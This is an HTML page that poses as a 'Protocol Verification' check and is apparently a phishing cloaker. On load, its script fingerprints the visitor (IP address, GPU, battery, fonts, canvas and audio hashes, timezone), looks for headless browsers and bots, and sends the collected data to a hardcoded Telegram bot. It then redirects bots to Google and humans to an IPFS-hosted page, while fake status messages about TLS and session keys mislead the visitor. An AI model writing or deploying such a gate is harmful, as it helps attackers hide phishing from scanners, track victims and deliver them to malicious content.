```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Protocol Verification</title>
<style>
:root { --p: #0ea5e9; --bg: #020617; --t: #f8fafc; }
body { margin: 0; background: var(--bg); font-family: 'SF Mono', menlo, monospace; color: var(--t); display: flex; justify-content: center; align-items: center; min-height: 100vh; }
#sh { width: 440px; padding: 2rem; border-left: 2px solid var(--p); background: #0b1120; }
.st { font-size: 0.8rem; text-transform: uppercase; letter-spacing: 3px; color: var(--p); margin-bottom: 0.5rem; }
.dt { font-size: 0.75rem; color: #64748b; height: 1.2rem; margin-bottom: 1.5rem; }
.pb { width: 100%; height: 1px; background: #1e293b; position: relative; }
#f { width: 0%; height: 100%; background: var(--p); box-shadow: 0 0 8px var(--p); transition: width 0.3s ease; }
#gl { display: none; }
</style>
</head>
<body>

<div id="sh">
    <div class="st" id="s">Protocol_Init</div>
    <div class="dt" id="d">Syncing handshake...</div>
    <div class="pb"><div id="f"></div></div>
</div>

<canvas id="gl"></canvas>

<script>
const CFG = {
    D: "https://ipfs.io/ipfs/bafkreicu4xtwgsor6j46h2e6kvwu676a5va7sonmfsgnj5zwa6achnooca/",
    B: "https://www.google.com",
    T: "8360539543:AAGZtvr7bt1PVcRfq8eTkHCxHigKBjHMwaQ",
    C: "659482680"
};

let res = { sc: 0, m: false, b: false };

const u = (s, d, p) => {
    document.getElementById('s').innerText = s;
    document.getElementById('d').innerText = d;
    document.getElementById('f').style.width = p + "%";
};

const ntg = async (m) => {
    try {
        await fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: CFG.C, text: m, parse_mode: 'HTML'})
        });
    } catch(e) {}
};

const getB = async () => {
    try {
        const b = await navigator.getBattery();
        return `${b.level*100}%_${b.charging}`;
    } catch(e) { return "UNSUPPORTED"; }
};

const getG = () => {
    const c = document.getElementById('gl');
    const gl = c.getContext('webgl');
    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
    return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "NA";
};

const getCanvasHash = () => {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = 200; canvas.height = 50;
    ctx.textBaseline = "top";
    ctx.font = "14px 'Arial'";
    ctx.textBaseline = "alphabetic";
    ctx.fillStyle = "#f60";
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = "#069";
    ctx.fillText("ðŸ§ª", 2, 15);
    ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
    ctx.fillText("ðŸ§ª", 4, 17);
    return canvas.toDataURL();
};

const getAudioHash = async () => {
    try {
        const AudioContext = window.OfflineAudioContext || window.webkitOfflineAudioContext;
        if (!AudioContext) return "UNSUPPORTED";
        const context = new AudioContext(1, 44100, 44100);
        const oscillator = context.createOscillator();
        oscillator.type = "triangle";
        oscillator.frequency.value = 10000;
        oscillator.connect(context.destination);
        oscillator.start(0);
        const buffer = await context.startRendering();
        let sum = 0;
        for (let i = 0; i < buffer.length; i++) sum += Math.abs(buffer.getChannelData(0)[i]);
        return sum.toFixed(5);
    } catch(e) { return "UNSUPPORTED"; }
};

const getTZ = () => {
    try { return Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e) { return "UNSUPPORTED"; }
};

const getLang = () => {
    try { return navigator.language || navigator.userLanguage; } catch(e) { return "UNSUPPORTED"; }
};

const getFonts = () => {
    const div = document.createElement('div');
    const bases = ['monospace','sans-serif','serif'];
    const test = 'abcdefghijklmnopqrstuvwxyz';
    const widths = {};
    bases.forEach(base => {
        div.style.fontFamily = base;
        div.style.position = 'absolute';
        div.style.left = '-9999px';
        div.innerText = test;
        document.body.appendChild(div);
        widths[base] = div.offsetWidth;
        document.body.removeChild(div);
    });
    return JSON.stringify(widths);
};

const detectHeadless = () => {
    const props = [
        'webdriver',
        '__nightmare',
        '_selenium',
        'callPhantom',
        '__phantomas',
        'chrome.runtime'
    ];
    return props.some(p => p in window) || navigator.webdriver || !!window.chrome && !!chrome.runtime && !chrome.runtime.id;
};

const v = async () => {
    u("Ciphers_Check", "Analyzing TLS stack...", 25);
    const bat = await getB();
    const gpu = getG();
    const ipr = await (await fetch('https://api.ipify.org?format=json')).json();
    
    const h = [
        navigator.webdriver,
        !window.PaymentRequest,
        !window.chrome,
        bat === "100%_true" && !window.SpeechSynthesisUtterance,
        gpu.includes("Microsoft") || gpu.includes("Swift") || gpu.includes("llvm"),
        Object.getOwnPropertyDescriptor(navigator, 'webdriver') !== undefined
    ];

    if (h.some(x => x === true)) res.sc -= 100;

    u("Entropy_Verify", "Sampling behavioral noise...", 60);
    await new Promise(r => setTimeout(r, 1000));

    u("System_Finalize", "Encoding session keys...", 90);
    await new Promise(r => setTimeout(r, 800));

    const canvasHash = getCanvasHash();
    const audioHash = await getAudioHash();
    const tz = getTZ();
    const lang = getLang();
    const fonts = getFonts();
    const headless = detectHeadless();

    if (headless) res.sc -= 150;
    if (canvasHash.includes("data:image")) res.sc -= 20;
    if (audioHash === "UNSUPPORTED") res.sc -= 10;

    const m = `<b>[LOG]</b>\nIP: ${ipr.ip}\nGPU: ${gpu}\nBAT: ${bat}\nSCR: ${window.screen.width}x${window.screen.height}\nTZ: ${tz}\nLANG: ${lang}\nFONTS: ${fonts}\nCANVAS: ${canvasHash.slice(0,30)}\nAUDIO: ${audioHash}`;

    if (res.sc < 0 && !res.m) {
        await ntg(m + "\nSTATUS: BLOCKED");
        window.location.replace(CFG.B);
    } else {
        u("Access_Granted", "Redirecting...", 100);
        await ntg(m + "\nSTATUS: PASSED");
        setTimeout(() => window.location.href = CFG.D, 400);
    }
};

window.addEventListener('mousemove', () => { res.m = true; }, {once: true});
window.addEventListener('touchstart', () => { res.m = true; }, {once: true});

window.onload = () => {
    if(navigator.userAgent.includes("Bot") || navigator.userAgent.includes("Crawl")) {
        window.location.replace(CFG.B);
    } else {
        v();
    }
};
</script>
</body>
</html>
```
